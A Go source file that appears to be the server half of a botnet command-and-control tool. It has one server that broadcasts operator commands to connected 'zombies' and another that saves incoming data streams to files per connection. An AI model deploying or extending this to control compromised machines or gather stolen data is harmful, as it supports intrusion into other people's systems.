package Server

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"os"
)

func bindPort(cmd []string) {
	port := cmd[1]
	if !(len(cmd) == 4 && isAValidPortNumber(cmd[1])) {
		port = defaultPortNumber
	}
	switch cmd[0] {
	case "listening":
		setUpListeningServer(port, cmd[3])
	case "controlling":
		setUpControllerServer(port, cmd[3])
	default:
		log.Println("Unknown server type.")
	}

}

func setUpListeningServer(port string, name string) {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.Println("Unable to bind to port", port, ".")
	}
	defer listener.Close()
	i := 0
	chann := make(chan string)
	mu.Lock()
	listeningServers[name] = port
	listeningServersChannels[name] = chann
	mu.Unlock()
	outDir := fmt.Sprintf("%s/%s", outputDir, name)
	if !isExist(outDir) {
		os.Mkdir(outDir, 0755)
	}
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		for {
			select {
			case <-ctx.Done():
				return

			default:
				conn, err := listener.Accept()
				if ctx.Err() != nil {
					return
				}
				if err != nil {
					log.Println(err)
					break
				}
				go func() {
					if err := listenerServiceHandler(ctx, conn, outDir, name, i); err != nil {
						log.Println(err)
						return

					} else {
						return
					}
				}()
				i += 1

			}
		}
	}()
	for {
		message, _ := <-chann
		if message == "exit" {

			mu.Lock()
			delete(listeningServersChannels, name)
			delete(listeningServers, name)
			mu.Unlock()
			cancel()
			break
		}
	}
}
func listenerServiceHandler(ctx context.Context, conn net.Conn, outDir string, outFile string, id int) (err error) {
	defer conn.Close()

	fi, err := os.OpenFile(fmt.Sprintf("%s/%s-%d.txt", outDir, outFile, id), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		return err
	}
	defer fi.Close()
	done := make(chan error, 1)

	go func() {
		_, err := io.Copy(fi, conn)
		if err != nil {
			done <- err
		}
		done <- nil
	}()

	select {
	case <-ctx.Done():
		return nil
	case <-done:
		return err

	}
}

func setUpControllerServer(port string, name string) {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.Println("Unable to bind to port", port, ".")
	}
	defer listener.Close()
	zompbiesChannels := make([]chan string, 0)
	chann := make(chan string)
	ctx, cancel := context.WithCancel(context.Background())
	mu.Lock()
	controllingServersChannels[name] = chann
	controllingServers[name] = port
	mu.Unlock()
	go func() {
		i := 0
		for {
			select {
			case <-ctx.Done():
				return

			default:
				conn, err := listener.Accept()
				if ctx.Err() != nil {
					return
				}
				if err != nil {
					log.Println(err)
					continue
				}
				zompbiesChannels = append(zompbiesChannels, make(chan string))
				go zombiesHandler(conn, zompbiesChannels[i])
				i += 1

			}
		}
	}()

	for {
		message, open := <-chann
		if !open {
			log.Println(err)
			break
		}
		for _, ch := range zompbiesChannels {
			ch <- message
		}
		if message == "exit" {
			cancel()

			break
		}

	}
	mu.Lock()
	delete(controllingServersChannels, name)
	delete(controllingServers, name)
	mu.Unlock()
	cancel()

}
func zombiesHandler(conn net.Conn, chann chan string) {
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()
	for {
		command, open := <-chann
		if !open {
			return
		}
		if command == "exit" {
			return
		}
		writer := bufio.NewWriter(conn)
		if _, err := writer.WriteString(command); err != nil {
			log.Println(err)
			return
		}

		if err := writer.Flush(); err != nil {
			return
		}

	}

}
